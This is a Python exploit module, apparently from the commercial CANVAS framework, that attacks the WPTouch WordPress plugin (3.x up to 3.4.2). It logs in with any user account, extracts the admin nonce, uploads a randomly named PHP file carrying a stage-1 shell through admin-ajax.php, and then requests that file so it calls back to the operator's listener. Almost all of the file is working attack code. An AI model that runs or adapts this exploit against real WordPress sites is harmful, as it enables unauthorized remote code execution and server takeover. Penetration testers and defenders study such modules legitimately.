#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2014
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import time
import re
import urllib2
import cookielib
import urllib
import string
import random

if "." not in sys.path:
    sys.path.append(".")

import timeoutsocket
import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME                            = "WPTouch Nonce"
DESCRIPTION                     = "Shell upload vulnerability in the WPTouch WordPress Plugin"
VERSION                         = "1.0"

DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "BraveNewCode"
DOCUMENTATION["Date public"]   = "07/12/2014"
DOCUMENTATION["CERT Advisory"] = "None"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://blog.sucuri.net/2014/07/disclosure-insecure-nonce-generation-in-wptouch.html"
DOCUMENTATION["CVE Name"]      = "CWE-434"
DOCUMENTATION["CVE Url"]       = "https://cwe.mitre.org/data/definitions/434.html"
DOCUMENTATION["Changelog"]     = "https://wordpress.org/plugins/wptouch/changelog/"
DOCUMENTATION["Notes"]         = """

Vulnerable versions are 3.x <= 3.4.2

This is a post authentication shell upload vulnerability in a popular
(~6 million downloads) WordPress plugin. Any account type (Admin, Editor, Author,
Contributor, Subscriber) will be able to hit the vulnerable functionality.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.debug      = False
        self.ssl        = None
        self.url        = None
        self.username   = None # This is Post-Auth
        self.password   = None
        self.hostname   = None # In the case of vhosts
        self.charSet    = string.lowercase + string.digits
        self.shellFile  = ''.join(random.sample(self.charSet*8, 8))
        self.nonce      = None # We obtain a nonce that allows us to upload files

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("username")
        self.getarg("password")
        self.getarg("hostname")

        self.node = self.argsDict["passednodes"][0]

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Post-auth shell upload vulnerability in the WPTouch plugin for Wordpress 3.x <= 3.4.2"
        print "-O url:<path to wordpress>" # ex: wordpress/
        print "-O ssl:<True/False>"
        print "-O username:<username>"
        print "-O password:<password>"
        print "-O hostname:<hostname> # If no DNS record is present for the host, use the IP"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a wordpress page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "wp-login.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "wp-login.php"
            self.log("[+] Checking that %s is the WordPress login page" % testUrl)
            (testResponse, testCode) = spkproxy.urlopen(testUrl,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
            resData = testResponse.read()
        except IOError as e:
            self.log("[EE] Failed to connect to provided URL (%s)" % testUrl)
            self.log(e.strerror)

        # Test the results
        if testCode == -1:
            self.log("[EE] Unable to contact the server at %s" % testUrl)
        elif testCode != 200:
            self.log("[ii] Received an HTTP STATUS CODE of %d" % testCode)
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testCode)
        elif re.search("Lost your password", resData, re.IGNORECASE):
            self.log("[ii] Found the WordPress login page, proceeding")
            self.url = testUrl.replace("wp-login.php", "")
            return True
        else:
            self.log("[EE] Didn't find the expected WordPress login page, aborting")
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testUrl)

        return False

    def parseCookies(self, res, exheaders):
        """
        We have to handle cookies ourselves with spkproxy
        """
        cookie = ""
        for line in res.read().splitlines():
            if "Set-Cookie" in line:
                temp = line.split(" ")[1]
                cookie += temp + " "
        exheaders.append(("Cookie", cookie))

        return exheaders

    def logInToWordpress(self):
        """
        This is post-auth so we'll need to log in
        """
        exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
        authString = "log=" + self.username + "&pwd=" + self.password + "&wp-submit=Log+in"
        (res, code) = spkproxy.urlopen(self.url + "wp-login.php",
                                       extraheaders = exheaders,
                                       data = authString,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 302:
            exheaders = self.parseCookies(res, exheaders)
            return exheaders
        else:
            self.log("[EE] Login failed")
            return False

    def grabNonce(self, exheaders):
        """
        Visiting the wp-admin page gets us the required nonce, this is vulnerability #1
        """
        self.log("[+] Finding nonce")
        (res, code) = spkproxy.urlopen(self.url + "wp-admin/index.php",
                                       extraheaders = exheaders,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)

        data = res.read().splitlines()
        for line in data:
            ret = re.search("\"admin_nonce\":\"(.+?)\"", line, re.IGNORECASE)
            if ret:
                self.nonce = ret.groups()[0]
                self.log("[+] Setting nonce to %s" % self.nonce)
                return True

        if not self.nonce:
            self.log("[EE] Unable to find the admin nonce")

        return False

    def uploadShell(self, exheaders):
        """
        Upload a shell through our authenticated session
        The plugin doesn't restrict file upload types, vulnerability #2
        """
        # Generate the PHP callback
        host        = self.callback.ip
        port        = self.callback.port
        badChars    = ""

        # This is the code that'll be inserted on the remote machine
        # if you want a custom shell do it here
        ret = "<?php " + get_php_stage1(badChars, host, port) + " ?>"

        # Create our payload to POST
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"action\"\r\n"
        payload += "\r\nupload_file\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"file_type\"\r\n"
        payload += "\r\nhomescreen_image\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"setting_name\"\r\n"
        payload += "\r\nwptouch__foundation__android_others_icon\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"wp_nonce\"\r\n"
        payload += "\r\n%s\r\n" % self.nonce
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"myfile\"; filename=\"%s.php\"\r\n" % self.shellFile
        payload += "Content-Type: application/octet-stream\r\n\r\n"
        payload += "%s\r\n" % ret
        payload += "--576a5sdf6--\r\n"

        # Update connection parameters
        url = self.url + "wp-admin/admin-ajax.php"
        exheaders.remove(("Content-Type", "application/x-www-form-urlencoded"))
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Make the POST
        (res, code) = spkproxy.urlopen(url,
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = False,
                                       return_response_code = True)
        # Check for failure
        text = res.read()
        if re.search("sufficient permissions", text):
            self.log("[EE] The account provided did not have the required permissions to exploit this vulnerability")
            return False
        else:
            self.log("[ii] Shell upload seems to have been successful")
        return True

    def trigger(self):
        """
        Visit our callback
        """
        url = self.url + "wp-content/wptouch-data/uploads/%s.php" % self.shellFile
        self.log("[+] Trying to visit %s" % url)
        (trigResp, trigCode) = spkproxy.urlopen(url, verb = "GET", hostname = self.hostname, entireresponse = True, return_response_code = True)
        if trigCode != 200:
           self.log("[ii] Received HTTP STATUS CODE of %d" % trigCode)
           self.log("[EE] Our upload failed for an unknown reason")
        else:
           self.log("[ii] Upload succeeded")
           return True

        return False

    def run(self):
        self.getargs()

        # print self.host

        if self.testUrl():
            exheaders = self.logInToWordpress()
            if (exheaders
                and self.grabNonce(exheaders)
                and self.uploadShell(exheaders)
               ):
                if self.trigger():
                    return True

        return False


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
